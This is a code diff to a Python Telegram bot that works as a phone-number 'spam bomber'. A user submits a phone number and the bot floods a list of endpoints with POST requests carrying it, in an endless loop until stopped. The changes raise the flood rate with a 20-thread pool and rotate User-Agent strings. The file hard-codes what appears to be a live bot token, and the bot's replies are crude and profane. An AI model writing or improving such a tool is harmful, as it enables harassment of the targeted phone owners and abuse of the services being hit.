@@ -3,7 +3,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import requests
 import threading
 import re
-from random import choice
+from concurrent.futures import ThreadPoolExecutor
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
 
@@ -35,16 +35,21 @@ awaiting = set()
 def is_phone(s):
     return bool(re.match(r'^\+?\d{7,15}$', s.strip()))
 
-def spammer(chat_id, phone, stop):
-    session = requests.Session()
-    while not stop.is_set():
-        for url in endpoints:
-            if stop.is_set():
+def send_one(phone, url, headers):
+    try:
+        requests.post(url, data={'phone': phone}, headers=headers, timeout=3)
+    except:
+        pass
+
+def spam_loop(chat_id, phone, stop_event):
+    executor = ThreadPoolExecutor(max_workers=20)
+    while not stop_event.is_set():
+        headers = {'User-Agent': USER_AGENTS[hash(phone + str(threading.get_ident())) % len(USER_AGENTS)]}
+        futures = [executor.submit(send_one, phone, url, headers) for url in endpoints]
+        for f in futures:
+            if stop_event.is_set():
+                executor.shutdown(wait=False)
                 break
-            try:
-                session.post(url, data={'phone': phone}, headers={'User-Agent': choice(USER_AGENTS)}, timeout=5)
-            except:
-                pass
     active.pop(chat_id, None)
     bot.send_message(chat_id, "spam zakanchivaetsya pizdec")
 
@@ -55,18 +60,14 @@ def start(m):
     bot.send_message(m.chat.id, "zdarova pidr gotov spamat?", reply_markup=kb)
 
 @bot.callback_query_handler(func=lambda c: c.data == "spam")
-def cb(c):
+def callback_spam(c):
     bot.answer_callback_query(c.id)
-    ask_phone(c.message)
-
-@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'spam')
-def ask_phone(m):
-    cid = m.chat.id
+    cid = c.message.chat.id
     if cid in active:
-        bot.reply_to(m, "spam uje rabotaet ebalo zakroy i /stop")
+        bot.send_message(cid, "spam uje rabotaet ebalo zakroy i /stop")
         return
     awaiting.add(cid)
-    bot.reply_to(m, "napishi nomer bystro hui")
+    bot.send_message(cid, "napishi nomer bystro hui")
 
 @bot.message_handler(func=lambda m: m.chat.id in awaiting and is_phone(m.text))
 def start_spam(m):
@@ -80,7 +81,7 @@ def start_spam(m):
     bot.reply_to(m, "drochka poehala chtoby zakanchivat /stop")
     stop = threading.Event()
     active[cid] = stop
-    threading.Thread(target=spammer, args=(cid, phone, stop), daemon=True).start()
+    threading.Thread(target=spam_loop, args=(cid, phone, stop), daemon=True).start()
 
 @bot.message_handler(commands=['stop'])
 def stop_cmd(m):
